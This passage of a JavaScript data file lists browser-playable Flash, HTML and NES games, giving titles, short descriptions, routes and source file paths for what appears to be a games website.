		source: "/swf/Gridlock.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo",
		description: "Hobo is the first instalment of this fun fighting game. You take control of a hobo and must fight your way through the streets! Don't let anyone boss you around or mistreat you - if they try to then use your super strength to punch and kick them into oblivion! Your hobo has a range of different fighting moves so try to use them all to defeat your enemies.",
		tags: "",
		route: "hobo",
		source: "/swf/Hobo.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Indestructo Tank",
		description: "As the pilot of an indestructable tank, you have certain responsibilities - Kicking Butt! Use the enemies weapons against them as you catapult yourself through the air and destroy the enemy air force!",
		tags: "",
		route: "indestructo-tank",
		source: "/swf/IndestructoTank.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Line Rider 2",
		description: "Line Rider is an internet game, with versions available for Microsoft Silverlight, Javascript, Windows, and Flash. It was originally created in September 2006 by Boštjan Čadež, a Slovenian student. Soon after its initial appearance on DeviantArt, Line Rider became an internet phenomenon.",
		tags: "",
		route: "line-rider-2",
		source: "/swf/Line Rider 2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Mario Revived",
		description: "Super Mario Revived is a upcoming exploration and 3-D platformer created by Nintendo for the Nintendo Spectrum, the Nintendo Switch, and the 3DS (in a non-HD style). It is a nostalgia game, with old enemies and obstacles and new features mixed in along with it.. It is said to be the longest platformer in history of Mario.",
		tags: "",
		route: "mario-revived",
		source: "/swf/Mariorevived.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Max Dirt Bike 1",
		description: "Max Dirt Bike is the ultimate balance game. All you're going to need to remember if you wanna succeed in the fast-paced, highly competitive world of internet dirt biking is this: rev, charge, balance & brake. There isn't a hill you can't climb, a slope you can't overcome or a valley you won't dominate if you master the art of revving up, balancing on the brink, charging the hills and braking when the situation requires it. Max Dirt Bike is a smart physics action game that puts your dexterity and puzzle muscles to the test. If you want to end each level by fading into the darkness and disappearing to thee great leaderboard in the sky, then this is the. game you've been waiting for. The first, best, and most played dirt bike game with such a cool background!",
		tags: "",
		route: "max-dirt-bike-1",
		source: "/swf/MaxDirtBike1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Monopoly",
		description: "Monopoly is a real-estate board game for two to eight players. The player's goal is to remain financially solvent while forcing opponents into bankruptcy by buying and developing pieces of property. Bankruptcy results in elimination from the game. The last player remaining on the board is the winner.",
		tags: "",
		route: "monopoly",
		source: "/swf/Monopoly.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "N",
		description: "In N, the player controls a ninja who navigates tile-based levels while simultaneously avoiding hazards, collecting gold, and eventually opening an exit door which completes the level.",
		tags: "",
		route: "n",
		source: "/swf/N.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Parachute",
		description: "Parachute is a video game released in 1983 by Homevision for the Atari 2600. The game puts the player in the role of parachutist who is falling gently from the sky. In order to land safely, the player must evade aeroplanes, helicopters, birds and hot-air balloons.",
		tags: "",
		route: "parachute",
		source: "/swf/Parachute.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Portal",
		description: "Portal: The Flash Version includes over 40 challenging, portals thinking levels, which features almost every feature the real game does, in 2d - energy balls, cubes, turrets and even the famous crusher from the trailer. The game also includes a console to mess around with after finishing the game, or just being frustrated by thinking with portals!",
		tags: "",
		route: "portal",
		source: "/swf/Portal.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Prince of War",
		description: "Prince of War is an action packed war game where you are tasked to defeat the orcs to keep your supply line running. Defeat all of the orcs they throw at you to improve your forces' morale. Your kingdom is yours to save!",
		tags: "",
		route: "prince-of-war",
		source: "/swf/PrinceofWar.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Prince of War 2",
		description: "23 years after Prince of War, the sequel starts in the midst of civil unrest in the nation of Veidar. The duchy of Valis is rising against the kingdom with Duke Dunkeld leading the enemy armies. However, behind the enemy lines lurks something dark and evil...",
		tags: "",
		route: "prince-of-war-2",
		source: "/swf/PrinceofWar2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Raft Wars",
		description: "Raft Wars is a fun, level-based shooting game created by Martijn Kunst, where you and your brother Simon will need to defend your treasure from enemies of all kinds!",
		tags: "",
		route: "raft-wars",
		source: "/swf/RaftWars.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Shock 1",
		description: "",
		tags: "",
		route: "shock-1",
		source: "/swf/SHOCK1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Staggy the Boy Scout Slayer 2",
		description: "The boy scouts must die. This knight knows the scouts evil ways, and you must help cut away the freckled masses.",
		tags: "",
		route: "staggy-the-boy-scout-slayer-2",
		source: "/swf/Staggy The Boy Scout Slayer II.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Stick War",
		description: "Stick War is a classic strategy war game featuring stick figures. This original title was released in 2009 in Flash, and is now available to play in your web browser through Ruffle. Wage war through several nations and bring peace to the continent through a fun, action-packed campaign!",
		tags: "",
		route: "stick-war",
		source: "/swf/Stick War.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Storm the House 2",
		description: "Storm The House 2 is a sequel to Storm the House. Enjoy!",
		tags: "",
		route: "storm-the-house-2",
		source: "/swf/StormtheHouse2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tactical Assassin",
		description: "Tactical Assassin is a mission based sniping game that puts your cunning and accuracy to the test. Every level, you are given different targets to assassinate to clear your mission. You will need to make your clients happy so make sure to time and sequence your shots perfectly. Become the best sniper with Tactical Assassin!",
		tags: "",
		route: "tactical-assassin",
		source: "/swf/TacticalAssassin.swff",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tactical Assassin 2",
		description: "Tactical Assassin 2 is a game in which you play as a sniper in the shadows. You'll be given different targets to eliminate, and you'll all do them while hidden away from the enemy. You're also not just some sniper, you have your own morals and codes, and that includes a very important rule - killing innocent people is not an option.",
		tags: "",
		route: "tactical-assassin-2",
		source: "/swf/TacticalAssassin2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "The Unfair Platformer",
		description: "The Unfair Platformer is a funny and unique platformer game with a lot of traps in it. Stay careful and aware or you'll die.",
		tags: "",
		route: "the-unfair-platformer",
		source: "/swf/The Unfair Platformer.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Toss the Turtle",
		description: "Use cannons, bombs, and jetpacks to shoot your turtle as far as possible! Collect cash to upgrade your equipment.",
		tags: "",
		route: "toss-the-turtle.swf",
		source: "/swf/Toss The Turtle.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zelda",
		description: "The Legend of Zelda is a high fantasy action-adventure video game franchise created by Japanese game designers Shigeru Miyamoto and Takashi Tezuka. It is primarily developed and published by Nintendo, although some portable installments and re-releases have been outsourced to Capcom, Vanpool, and Grezzo.",
		tags: "",
		route: "zelda",
		source: "/swf/Zelda.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zoeken",
		description: "",
		tags: "",
		route: "zoeken",
		source: "/swf/Zoeken.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Armor RPG Experiment",
		description: "Power up your attack, magic, and defense, and clash against your evil opponent to win experience and items.",
		tags: "",
		route: "armor-rpg-experiment",
		source: "/swf/armorrpg_mod.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Galaga",
		description: "Galaga is a 1981 fixed shooter arcade video game developed and published by Namco. In North America, it was released by Midway Manufacturing. It is the sequel to Galaxian, Namco's first major video game hit in arcades.",
		tags: "",
		route: "galaga",
		source: "/swf/galaga.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Geo Land RPG",
		description: "A fun RPG game with travel between 2 dimensions in order to save the world from an unknown enemy.",
		tags: "",
		route: "geo-land-rpg",
		source: "/swf/geolandrpg.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Grid 16",
		description: "Tons of small games, each getting harder and harder as time speeds up. Survive as long as you can in the grid.",
		tags: "",
		route: "grid-16",
		source: "/swf/grid16.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Grow Island",
		description: "Grow Island is an episode of Grow series in which you need to place the correct items in order to develop your island fully.",
		tags: "",
		route: "grow-island",
		source: "/swf/growisland.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gun Blood",
		description: "This town isn't big enough for the two of us, so draw! If you have ever wanted to be a part of a western duel, then look no further than Gunblood! Choose from one of ten wild west characters and attempt to outshoot your opponents! Nine rounds of intense, reaction based duels await you in this visceral game! After every successful duel, you are met with another, more challenging opponent and your odds of survival greatly decrease! Can you win every duel and prove that you are the best shot in town?",
		tags: "",
		route: "gun-blood",
		source: "/swf/gunblood.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hell Cops",
		description: "You're a cop on a mission to kill. Run over everyone and everything to get to the end of each level. If you crash, you fail. If you don't kill right, you fail.",
		tags: "",
		route: "hell-cops",
		source: "/swf/hell-cops.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hexxagon",
		description: "Play Hexxagon online for free! A highly addictive, radioactive and hexagonal board game based on Ataxx.",
		tags: "",
		route: "hexxagon",
		source: "/swf/hexxagon.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo 4: Total War",
		description: "This time our beloved Hobo takes on the whole army. He is a wanted menace and everyone wants him dead. Prepare for total war, Hobo style!",
		tags: "",
		route: "hobo-4-total-war",
		source: "/swf/hobo-4-total-war-749179f9.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo 5: Space Brawls",
		description: "Hobo 5 is a game where you play as a hobo who tries to escape from the alien's abduction. Fight with the aliens by kicking and punching them!",
		tags: "",
		route: "hobo-5-space-brawls",
		source: "/swf/hobo-5-space-brawls--11410f2f2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo 6: Hell",
		description: "Hobo 6 is subtitled Hell, and that is what you can expect in this game. Hobo has left earth for hell and is now facing demons and Satan himself. Arrow keys to move, A to punch and pick up objects, S for kicks and other things. Have fun!",
		tags: "",
		route: "hobo-6-hell",
		source: "/swf/hobo-6-hell-136403467.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo 7: Heaven",
		description: "No lazy hobos allowed in Heaven! Hobo must kick and punch his way in, pulling off combos with the keyboard for disgusting special moves.",
		tags: "",
		route: "hobo-7-heaven",
		source: "/swf/hobo-7-heaven-14404_6.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo 3: Wanted",
		description: "Hobo 3 continues with the story line where Hobo is a wanted fugitive after escaping from prison, and the government wants him dead or alive.",
		tags: "",
		route: "hobo-3-wanted",
		source: "/swf/hobo3-wanted-5673395b.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hobo Prison Brawl",
		description: "Hobo Prison Brawl is an action game that lets you play as a hobo prison inmate who has had enough of the place, and is now ready to beat the living daylights out of everyone so he can escape! Beat up other prisoners and prison guards as you try to leave, while also learning new combos to give them everyone even more pain and punishment.",
		tags: "",
		route: "hobo-prison-brawl",
		source: "/swf/hoboprisonbrawl.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hot Corn",
		description: "",
		tags: "",
		route: "hot-corn",
		source: "/swf/hotcorn.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Impossible Quiz Book",
		description: "The Impossible Quiz Book is a quiz-centered game that gives you a ton of questions to answer. There's a little twist though, not everything is as simple as they seem. Some of the questions will need some out-of-context answers, and you'll need to think through them. You'll be using all the information shown on-screen (not just the multiple choices they give you), which means you might need to check the interface for buttons you can press, or a keyboard key you might need to hit to get to the next question.",
		tags: "",
		route: "impossible-quiz-book",
		source: "/swf/impossiblequizbook.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Indestructo Tank 2",
		description: "Indestructo Tank is back for even more blasts, ready for some more Indestructo-Fun? Take on the Role of IndestructoTank pilot Dirk Danger and play through all new game modes!",
		tags: "",
		route: "indestructo-tank-2",
		source: "/swf/indestructotank2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Interactive Buddy 2",
		description: "The sequel to Interactive Buddy! Interact with the buddy using many new items and weapons!",
		tags: "",
		route: "interactive-buddy-2",
		source: "/swf/interactivebuddy2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Internet RPG",
		description: "",
		tags: "",
		route: "internet-rpg",
		source: "/swf/internet-rpg.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Jump",
		description: "",
		tags: "",
		route: "jump",
		source: "/swf/jump.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Kung Fu Remix 2",
		description: "Kung Fu Remix classic game. A remake of the NES classic.",
		tags: "",
		route: "kung-fu-remix-2",
		source: "/swf/kungfuremix2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Line Game Orange",
		description: "In this game, you have to guide this orange line. It needs to reach its destination which is a green spot. There are many obstacles on the way. Make sure that you help it from the start to the end. This orange line is very sensitive so you have to take care of it. It is time to have some fun!",
		tags: "",
		route: "line-game-orange",
		source: "/swf/linegameorange.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Mario Combat",
		description: "Your Super Mario! What does that mean? It means you gotta go kick Bowsers butt! And that's exactly what your going to do!",
		tags: "",
		route: "mario-combat",
		source: "/swf/mariocombat.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Mini Putt",
		description: "Place the golf balls and hit them skillfully in various tricky golf courses.",
		tags: "",
		route: "mini-putt",
		source: "/swf/miniputt.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Only Level",
		description: "This Is The Only Level is a simple fun game where you must find a way to go to the finish point with a different twist in each level.",
		tags: "",
		route: "only-level",
		source: "/swf/onlylevel.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "PacXon",
		description: "Pacxon is an addicting arcade game, based on the classic Pacman game, Pac xon will keep you challenged for hours.",
		tags: "",
		route: "pacxon",
		source: "/swf/pacxon.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pandemic 1",
		description: "Evolve, Infect, Kill! Pandemic is a game where you get to evolve you own biological virus and wipe out mankind!",
		tags: "",
		route: "pandemic-1",
		source: "/swf/pandemic-1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pandemic 2",
		description: "Pandemic 2 is a free game about the spread of a dangerous pandemic in the modern age. This is a strategy game about the danger and threat of an aggressive virus as it slowly spreads its way across the globe. By playing as the virus instead of as medics, researchers, or other members of the medical and scientific communities you will see the mechanisms by which a virus may spread. This is a casual game with simple mechanics that allow for deep meaningful choices on behalf of the player. As the game continues your objective will be to spread your virus as far, as wide, and as fat as you possibly can. As your virus evolves you'll gain experience points. With these experience points, you will be able to purchases upgrades. You can choose from a lit of different symptoms which all have their own ways of helping the virus spread. This is a casual time-management game so you'll have to upgrade and then wait and see if your disease is progressing before your time limit. As time passes, you'll gain evolution points which is what you can use to purchase upgrades.",
		tags: "",
		route: "pandemic-2",
		source: "/swf/pandemic2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Parking Mania",
		description: "Use the arrow keys to steer and drive the car forward and backward. The goal is to park the car in the parking space. Just don't crash into anything!",
		tags: "",
		route: "parking-mania",
		source: "/swf/parkingmania.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Powerpuff Girls Zombgone",
		description: "Help remove barriers standing in the way of these girls.",
		tags: "",
		route: "powerpuff-girls-zombgone",
		source: "/swf/powerpuff_girls_zombgone.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Raft Wars 2",
		description: "Raft Wars 2 is an action-packed shooting game created by Martijn Kunst as the sequel to the hit game Raft Wars. Simon and his brother return from a well-deserved holiday only to find a water park on top of where they've hidden their buried treasure.",
		tags: "",
		route: "raft-wars-2",
		source: "/swf/raft-wars-2_mochi_secure.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Real Estate Tycoon",
		description: "Real Estate Tycoon is playable online as an HTML5 game.",
		tags: "",
		route: "real-estate-tycoon",
		source: "/swf/real-estate-tycoon-1350817f.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Red Shift",
		description: "Level up your ship and take on the enemy!",
		tags: "",
		route: "red-shift",
		source: "/swf/redshift.swf ",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Robot Unicorn Attack",
		description: "",
		tags: "",
		route: "robot-unicorn-attack",
		source: "/swf/robotunicornattack.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads 1",
		description: "",
		tags: "",
		route: "sift-heads-1",
		source: "/swf/sift-heads-1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads 2",
		description: "",
		tags: "",
		route: "sift-heads-2",
		source: "/swf/sift-heads-2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads 3",
		description: "",
		tags: "",
		route: "sift-heads-3",
		source: "/swf/sift-heads-3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads 4",
		description: "",
		tags: "",
		route: "sift-heads-4",
		source: "/swf/sift-heads-4.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads 5",
		description: "",
		tags: "",
		route: "sift-heads-5",
		source: "/swf/sift-heads-5.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sift Heads World",
		description: "",
		tags: "",
		route: "sift-heads-world",
		source: "/swf/sift_heads_world.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sim Web 2.0 Company",
		description: "",
		tags: "",
		route: "sim-web-2-0-company",
		source: "/swf/simweb2.0company.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Skull Kid",
		description: "",
		tags: "",
		route: "skull-kid",
		source: "/swf/skull_kid.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sky Wire",
		description: "",
		tags: "",
		route: "sky-wire",
		source: "/swf/skywire.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Spank the Monkey",
		description: "",
		tags: "",
		route: "spank-the-monkey",
		source: "/swf/spankthemonkey.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Spider Man",
		description: "",
		tags: "",
		route: "spider-man",
		source: "/swf/spider-man.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sprinter",
		description: "",
		tags: "",
		route: "sprinter",
		source: "/swf/sprinter",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Stick RPG",
		description: "",
		tags: "",
		route: "stick-rpg",
		source: "/swf/stickrpg.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Submachine 1",
		description: "",
		tags: "",
		route: "submachine-1",
		source: "/swf/submachine_1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Submachine 2",
		description: "",
		tags: "",
		route: "submachine-2",
		source: "/swf/submachine_2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Submachine 3",
		description: "",
		tags: "",
		route: "submachine-3",
		source: "/swf/submachine_3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Smash Flash",
		description: "",
		tags: "",
		route: "super-smash-flash",
		source: "/swf/super_smash_flash.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario 63",
		description: "",
		tags: "",
		route: "super-mario-63",
		source: "/swf/supermario63.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Treasure Seas ",
		description: "",
		tags: "",
		route: "treasure-seas",
		source: "/swf/treasureseas.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tron",
		description: "",
		tags: "",
		route: "tron",
		source: "/swf/tron.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tsunami Fighter",
		description: "",
		tags: "",
		route: "tsunami-fighter",
		source: "/swf/tsunamifighter.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Use Boxmen",
		description: "",
		tags: "",
		route: "use-boxmen",
		source: "/swf/use-boxmen.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Warfare 1944",
		description: "",
		tags: "",
		route: "warfare-1944",
		source: "/swf/",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Kitten Cannon",
		description: "",
		tags: "",
		route: "kitten-cannon",
		source: "/swf/yetiGamesKitten Cannon.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Moto X3M",
		description: "",
		tags: "",
		route: "moto-x3m",
		source: "/src/moto-x3m/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Moto X3M Winter",
		description: "",
		tags: "",
		route: "moto-x3m-winter",
		source: "/src/moto-x3m-winter/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Moto X3M Spooky Land",
		description: "",
		tags: "",
		route: "moto-x3m-spooky-land",
		source: "/src/moto-x3m-spooky-land/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Moto X3M Pool Party",
		description: "",
		tags: "",
		route: "moto-x3m-pool-party",
		source: "/src/moto-x3m-pool-party/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Friday Night Funkin: Week 6",
		description: "",
		tags: "",
		route: "friday-night-funkin-week-6",
		source: "/src/friday-night-funkin--week-6/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Friday Night Funkin: Vs Ex",
		description: "",
		tags: "",
		route: "friday-night-funkin-vs-ex",
		source: "/src/friday-night-funkin--vs-ex/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hill Racing",
		description: "",
		tags: "",
		route: "hill-racing",
		source: "/src/hill-racing/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Running Bot Xmas Gifts",
		description: "",
		tags: "",
		route: "running-bot-xmas-gifts",
		source: "/src/running-bot-xmas-gifts/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Russian Taz Magmes",
		description: "",
		tags: "",
		route: "russian-taz-magmes",
		source: "/src/russian-taz-magmes/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Slope 2",
		description: "",
		tags: "",
		route: "slope-2",
		source: "/src/slope-2/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Game Inside a Game",
		description: "",
		tags: "",
		route: "game-inside-a-game",
		source: "/src/game-inside-a-game/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zombotron",
		description: "",
		tags: "",
		route: "zombotron",
		source: "/src/zombotron/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zombotron 2",
		description: "",
		tags: "",
		route: "zombotron-2",
		source: "/src/zombotron-2/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zombotron 2 Time Machine",
		description: "",
		tags: "",
		route: "zombotron-2-time-machine",
		source: "/src/zombotron-2-time-machine/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Donut Boy",
		description: "",
		tags: "",
		route: "donut-boy",
		source: "/src/donut-boy/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Henry Stick Fleeing The Complex",
		description: "",
		tags: "",
		route: "henry-stick-fleeing-the-complex",
		source: "/swf/HenryStick_FleeingTheComplex.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "A Dance of Fire and Ice",
		description: "A Dance of Fire and Ice is a strict rhythm game. Keep your focus as you guide two orbiting planets along a winding path without breaking their perfect equilibrium. Press on every beat of the music to move in a line. Every pattern has its own rhythm to it. It can get difficult. This game is purely based on rhythm, so use your ears more than your sight.",
		tags: "",
		route: "a-dance-of-fire-and-ice",
		source: "/src/a-dance-of-fire-and-ice/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Superhot",
		description: "No regenerating health bars. No conveniently placed ammo drops. It's just you, outnumbered and outgunned, grabbing weapons off fallen enemies to shoot, slice, and maneuver through a hurricane of slow-motion bullets.",
		tags: "",
		route: "superhot",
		source: "/src/superhot/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Wordle",
		description: "Wordle is a web-based word game developed by Welsh-born software engineer Josh Wardle. Players have six attempts to guess a five-letter word; feedback is given for each guess, in the form of colored tiles, indicating when letters match or occupy the correct position. This tweak has no limit to how many games you can play!",
		tags: "",
		route: "wordle",
		source: "/src/wordle/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Getaway Shootout",
		description: "Race on top of a moving train in Getaway Shootout and be the first to grab 3 getaways. Compete against computer AI or with a friend in 2 player mode to prove who is the best. There are many weapons and power-ups you can collect throughout the map use it wisely to to gain an upper hand over your opponents.",
		tags: "",
		route: "getaway-shootout",
		source: "/src/getaway-shootout/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Google Solitaire",
		description: "Patience, card solitaire or just solitaire, is a genre of card games that can be played by a single player. Patience games can also be played in a head-to-head fashion with the winner selected by a scoring scheme.",
		tags: "",
		route: "google-solitaire",
		source: "/src/google-solitaire/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Rooftop Snipers",
		description: "Rooftop Snipers is a chaotic two button local multiplayer game. Challenge your friends side by side or play the computer. Shoot your opponent off the map to win.",
		tags: "",
		route: "rooftop-snipers",
		source: "/src/rooftop-snipers/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tube Jumpers",
		description: "Tube Jumpers is local multiplayer game with your friends packed with action. The last one to stay on the tubes wins. Watch out for miscellaneous objects while watching your back from other players.",
		tags: "",
		route: "tube-jumpers",
		source: "/src/tube-jumpers/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario Bros",
		description: "Mario Bros. is a 1983 platform game developed and published for arcades by Nintendo. It was designed by Shigeru Miyamoto and Gunpei Yokoi, Nintendo's chief engineer. Italian plumber Mario and his twin brother Luigi exterminate creatures emerging from the sewers by knocking them upside-down and kicking them away.",
		tags: "",
		route: "super-mario-bros",
		source: "/emulator/nes/smb.nes",
		gameType: "nes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "A Dark Room",
		description: "A Dark Room is a minimalist text-based adventure RPG game right in your browser! How far will you go, player?",
		tags: "",
		route: "a-dark-room",
		source: "/src/a-dark-room/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Align 4",
		description: "Align 4 is a two-player connection board game just like Connect 4, in which the players choose a color and then take turns dropping colored discs into a seven-column, six-row vertically suspended grid. The pieces fall straight down, occupying the lowest available space within the column. The objective of the game is to be the first to form a horizontal, vertical, or diagonal line of four of one's own discs. The first player can always win by playing the right moves.",
		tags: "",
		route: "align-4",
		source: "/src/align-4/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Colorun",
